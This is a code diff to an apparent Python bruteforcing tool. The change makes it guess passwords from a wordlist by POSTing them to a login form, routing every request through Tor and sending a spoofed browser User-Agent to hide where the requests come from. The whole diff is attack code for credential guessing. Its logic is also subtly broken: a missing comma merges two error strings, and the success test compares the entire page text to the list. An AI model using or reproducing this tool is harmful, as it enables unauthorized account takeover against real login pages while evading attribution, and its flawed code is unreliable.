@@ -1,5 +1,8 @@
 import requests
 import os
+import io
+import stem.process
+import re
 import methods
 import argparse
 from platform import platform
@@ -14,31 +17,75 @@ OS = "windows" if "windows" in platform().lower() else "linux"
 # Set the username of the currently logged in user
 USER_OS = os.getlogin()
 
-# Bruteforce mode
+# Get the tor path
+TOR_PATH = methods.get_tor_path(OS)
+
+# Here you put the error message you get, when you enter the wrong password (lower case)
+ERROR_MSGS = [
+    'invalid'
+    'incorrect',
+    'wrong',
+    'wrong password',
+    'invalid password',
+    'incorrect password',
+    'invalid username or password',
+    'invalid username/password',
+    'invalid username or password',
+    'invalid username/password',
+    'false password',
+    'falscher benutzername oder falsches passwort',
+    'falscher benutzername',
+    'falsches passwort',
+    'inkorrekte anmeldedaten',
+    'falsche anmeldedaten',
+    'falsche benutzerdaten',
+    'inkorrekt'
+]
+
+# Set the proxy by TOR
+def set_proxy() -> None:
+    SOCKS_PORT = 9050
+    tor_process = stem.process.launch_tor_with_config(
+        config = {
+            'SocksPort': str(SOCKS_PORT),
+        },
+        init_msg_handler = lambda line: print(line) if re.search('Bootstrapped', line) else False,
+        tor_cmd = TOR_PATH
+    )
+
+# Bruteforcing method using TOR proxies
 def bruteforce(username: str, password_list: str, URL, proxy: str) -> None:
-    print('Starting bruteforce mode...')
-    response = None
-    with open(password_list, 'r') as passwords:
-        for password in passwords:
-            password = password.strip()
-            if proxy:
-                proxies = {
-                    'http': proxy,
-                    'https': proxy
-                }
-                try:
-                    response = requests.get(URL, auth=(username, password), proxies=proxies)
-                except:
-                    print(colored(f'Error: Invalid proxy', 'red'))
-                    exit()
-            else:
-                response = requests.get(URL, auth=(username, password))
-            if response.status_code == 200:
-                print(colored(f'HIT: Password found: {password}', 'green'))
-                break
-            else:
-                continue
-    print('Finished bruteforce mode...')
+    # Read the password list
+    with open(password_list, 'r', errors='ignore') as password_list:
+        passwords = password_list.readlines()
+    
+    # Set the proxy to TOR
+    proxy = {
+        'http': 'socks5://127.0.0.1:9050',
+        'https': 'socks5://127.0.0.1:9050' 
+    }
+    
+    # Set the headers
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36'
+    }
+    
+    # Set the form data
+    data = {
+        'username': username,
+        'password': ''
+    }
+    
+    # Loop over the passwords
+    for password in passwords:
+        set_proxy()
+        data['password'] = password.strip()
+        r = requests.post(URL, headers=headers, data=data, proxies=proxy)
+        
+        # If the password is correct
+        if r.text.lower() not in ERROR_MSGS:
+            print(colored(f'HIT: {password}', 'green'))
+            break
 
 def main(args: list[str]) -> None:
     '''
